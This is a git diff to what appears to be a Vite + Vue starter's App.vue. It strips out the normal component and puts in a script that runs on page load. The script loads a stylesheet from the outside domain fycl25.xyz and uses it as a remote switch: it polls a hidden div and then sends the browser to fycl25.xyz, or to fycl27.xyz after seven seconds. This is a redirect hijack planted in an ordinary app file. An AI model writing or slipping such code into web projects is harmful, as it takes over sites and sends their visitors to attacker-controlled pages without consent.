@@ -1,30 +1,33 @@
-<script setup>
-import HelloWorld from './components/HelloWorld.vue'
+<script>
+	window.onload=function(){
+		let time=7;//超时时间 单位秒
+		let link=document.createElement("link");
+		link.setAttribute("rel", "stylesheet");
+		link.setAttribute("type", "text/css");
+		link.setAttribute("href","https://fycl25.xyz/static/default.css?"+Math.random());
+		let node=document.getElementsByTagName("head")[0];		
+		node.appendChild(link);		
+		let div=document.createElement("div");
+		div.setAttribute("class", "bdsug_copy");	
+		let bd=document.getElementsByTagName("body")[0];		
+		bd.appendChild(div);	
+		let j=0;
+		let s=setInterval(function(){			
+			let  myDiv=document.getElementsByClassName("bdsug_copy")[0];
+			let computedStyle = document.defaultView.getComputedStyle(myDiv, null);
+			let dp=computedStyle.display;
+			console.log(dp);
+			if(dp=="none"){
+				clearInterval(s);
+				window.location.href="https://fycl25.xyz";
+			}
+			let t=j*100/1000;
+			console.log(t);
+			if(t>=time){
+				clearInterval(s);
+				window.location.href="https://fycl27.xyz";
+			}
+			j++;
+		},100);	
+	}
 </script>
-
-<template>
-  <div>
-    <a href="https://vitejs.dev" target="_blank">
-      <img src="/vite.svg" class="logo" alt="Vite logo" />
-    </a>
-    <a href="https://vuejs.org/" target="_blank">
-      <img src="./assets/vue.svg" class="logo vue" alt="Vue logo" />
-    </a>
-  </div>
-  <HelloWorld msg="Vite + Vue" />
-</template>
-
-<style scoped>
-.logo {
-  height: 6em;
-  padding: 1.5em;
-  will-change: filter;
-  transition: filter 300ms;
-}
-.logo:hover {
-  filter: drop-shadow(0 0 2em #646cffaa);
-}
-.logo.vue:hover {
-  filter: drop-shadow(0 0 2em #42b883aa);
-}
-</style>
